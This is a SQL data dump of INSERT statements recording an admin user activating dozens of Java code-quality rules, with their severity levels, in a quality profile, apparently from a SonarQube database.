INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3326, '2017-11-20 12:51:23.263', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1710;ruleKey=squid:S1710;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7H_bbGRdfPp-rRi');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3327, '2017-11-20 12:51:23.285', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1751;ruleKey=squid:S1751;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7IVbbGRdfPp-rRj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3328, '2017-11-20 12:51:23.322', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1764;ruleKey=squid:S1764;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7I6bbGRdfPp-rRk');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3329, '2017-11-20 12:51:23.359', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1844;ruleKey=squid:S1844;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7JfbbGRdfPp-rRl');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3330, '2017-11-20 12:51:23.407', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1845;ruleKey=squid:S1845;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7KPbbGRdfPp-rRm');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3331, '2017-11-20 12:51:23.438', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1849;ruleKey=squid:S1849;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7KubbGRdfPp-rRn');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3332, '2017-11-20 12:51:23.454', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1854;ruleKey=squid:S1854;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7K-bbGRdfPp-rRo');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3333, '2017-11-20 12:51:23.479', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1858;ruleKey=squid:S1858;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7LXbbGRdfPp-rRp');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3334, '2017-11-20 12:51:23.506', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1860;ruleKey=squid:S1860;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7LybbGRdfPp-rRq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3335, '2017-11-20 12:51:23.538', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1862;ruleKey=squid:S1862;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7MSbbGRdfPp-rRr');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3336, '2017-11-20 12:51:23.585', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1871;ruleKey=squid:S1871;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7NAbbGRdfPp-rRs');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3337, '2017-11-20 12:51:23.612', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1872;ruleKey=squid:S1872;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7NcbbGRdfPp-rRt');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3338, '2017-11-20 12:51:23.64', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1905;ruleKey=squid:S1905;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7N4bbGRdfPp-rRu');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3339, '2017-11-20 12:51:23.665', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1940;ruleKey=squid:S1940;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7ORbbGRdfPp-rRv');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3340, '2017-11-20 12:51:23.685', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1948;ruleKey=squid:S1948;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7OlbbGRdfPp-rRw');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3341, '2017-11-20 12:51:23.708', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1989;ruleKey=squid:S1989;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7O8bbGRdfPp-rRx');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3342, '2017-11-20 12:51:23.738', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S1994;ruleKey=squid:S1994;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7PabbGRdfPp-rRy');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3343, '2017-11-20 12:51:23.765', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2055;ruleKey=squid:S2055;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7P1bbGRdfPp-rRz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3344, '2017-11-20 12:51:23.78', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2060;ruleKey=squid:S2060;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7QEbbGRdfPp-rR0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3345, '2017-11-20 12:51:23.819', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2061;ruleKey=squid:S2061;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7QrbbGRdfPp-rR1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3346, '2017-11-20 12:51:23.849', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2062;ruleKey=squid:S2062;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7RJbbGRdfPp-rR2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3347, '2017-11-20 12:51:23.91', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2065;ruleKey=squid:S2065;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7SGbbGRdfPp-rR3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3348, '2017-11-20 12:51:23.974', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2066;ruleKey=squid:S2066;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7TGbbGRdfPp-rR4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3349, '2017-11-20 12:51:24.071', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2068;ruleKey=squid:S2068;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7UnbbGRdfPp-rR5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3350, '2017-11-20 12:51:24.156', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2077;ruleKey=squid:S2077;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7V8bbGRdfPp-rR6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3351, '2017-11-20 12:51:24.181', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2092;ruleKey=squid:S2092;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7WVbbGRdfPp-rR7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3352, '2017-11-20 12:51:24.208', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2093;ruleKey=squid:S2093;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7WwbbGRdfPp-rR8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3353, '2017-11-20 12:51:24.235', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2094;ruleKey=squid:S2094;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7XLbbGRdfPp-rR9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3354, '2017-11-20 12:51:24.261', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2095;ruleKey=squid:S2095;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;param_excludedResourceTypes=;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7XlbbGRdfPp-rR-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3355, '2017-11-20 12:51:24.288', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2097;ruleKey=squid:S2097;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7YAbbGRdfPp-rR_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3356, '2017-11-20 12:51:24.313', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2109;ruleKey=squid:S2109;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7YZbbGRdfPp-rSA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3357, '2017-11-20 12:51:24.33', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2110;ruleKey=squid:S2110;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7YqbbGRdfPp-rSB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3358, '2017-11-20 12:51:24.346', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2111;ruleKey=squid:S2111;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7Y6bbGRdfPp-rSC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3359, '2017-11-20 12:51:24.369', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2112;ruleKey=squid:S2112;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7ZRbbGRdfPp-rSD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3360, '2017-11-20 12:51:24.404', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2114;ruleKey=squid:S2114;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7Z0bbGRdfPp-rSE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3361, '2017-11-20 12:51:24.452', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2116;ruleKey=squid:S2116;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7akbbGRdfPp-rSF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3362, '2017-11-20 12:51:24.486', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2118;ruleKey=squid:S2118;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7bGbbGRdfPp-rSG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3363, '2017-11-20 12:51:24.518', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2122;ruleKey=squid:S2122;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7bmbbGRdfPp-rSH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3364, '2017-11-20 12:51:24.539', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2123;ruleKey=squid:S2123;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7b7bbGRdfPp-rSI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3365, '2017-11-20 12:51:24.579', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2127;ruleKey=squid:S2127;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7cjbbGRdfPp-rSJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3366, '2017-11-20 12:51:24.618', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2129;ruleKey=squid:S2129;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7dKbbGRdfPp-rSK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3367, '2017-11-20 12:51:24.67', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2130;ruleKey=squid:S2130;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7d-bbGRdfPp-rSL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3368, '2017-11-20 12:51:24.726', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2131;ruleKey=squid:S2131;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7e2bbGRdfPp-rSM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3369, '2017-11-20 12:51:24.756', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2133;ruleKey=squid:S2133;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7fUbbGRdfPp-rSN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3370, '2017-11-20 12:51:24.804', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2134;ruleKey=squid:S2134;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7gEbbGRdfPp-rSO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3371, '2017-11-20 12:51:24.822', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2140;ruleKey=squid:S2140;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7gWbbGRdfPp-rSP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3372, '2017-11-20 12:51:24.849', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2142;ruleKey=squid:S2142;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7gxbbGRdfPp-rSQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3373, '2017-11-20 12:51:24.878', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2147;ruleKey=squid:S2147;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7hObbGRdfPp-rSR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3374, '2017-11-20 12:51:24.935', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2151;ruleKey=squid:S2151;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7iHbbGRdfPp-rSS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3375, '2017-11-20 12:51:24.979', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2153;ruleKey=squid:S2153;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7izbbGRdfPp-rST');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3376, '2017-11-20 12:51:25.01', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2154;ruleKey=squid:S2154;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7jSbbGRdfPp-rSU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3377, '2017-11-20 12:51:25.051', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2157;ruleKey=squid:S2157;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7j7bbGRdfPp-rSV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3378, '2017-11-20 12:51:25.086', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2159;ruleKey=squid:S2159;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7kebbGRdfPp-rSW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3379, '2017-11-20 12:51:25.115', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2160;ruleKey=squid:S2160;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7k7bbGRdfPp-rSX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3380, '2017-11-20 12:51:25.14', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2165;ruleKey=squid:S2165;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7lUbbGRdfPp-rSY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3381, '2017-11-20 12:51:25.165', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2166;ruleKey=squid:S2166;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7ltbbGRdfPp-rSZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3382, '2017-11-20 12:51:25.2', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2167;ruleKey=squid:S2167;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7mQbbGRdfPp-rSa');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3383, '2017-11-20 12:51:25.222', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2168;ruleKey=squid:S2168;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7mmbbGRdfPp-rSb');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3384, '2017-11-20 12:51:25.253', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2175;ruleKey=squid:S2175;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7nFbbGRdfPp-rSc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3385, '2017-11-20 12:51:25.299', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2176;ruleKey=squid:S2176;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7nzbbGRdfPp-rSd');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3386, '2017-11-20 12:51:25.329', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2177;ruleKey=squid:S2177;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7oRbbGRdfPp-rSe');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3387, '2017-11-20 12:51:25.351', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2178;ruleKey=squid:S2178;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7onbbGRdfPp-rSf');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3388, '2017-11-20 12:51:25.365', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797:squid:S2183;ruleKey=squid:S2183;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy001-65797;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Ze7o1bbGRdfPp-rSg');
